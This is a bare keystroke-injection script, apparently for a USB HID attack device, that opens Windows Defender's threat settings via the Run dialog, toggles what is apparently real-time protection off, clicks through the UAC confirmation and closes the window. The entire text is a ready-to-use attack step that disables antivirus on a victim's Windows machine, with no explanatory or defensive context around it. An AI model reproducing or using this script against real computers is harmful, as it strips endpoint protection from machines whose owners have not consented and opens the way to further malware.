layout('us');
press("GUI r");
delay(500);
type("windowsdefender://ThreatSettings")
delay(200);
press("ENTER");
delay(1000);
press("SPACE");
delay(1000);
press("SHIFT TAB");
delay(200);
press("ENTER");
delay(500);
press("ALT F4");
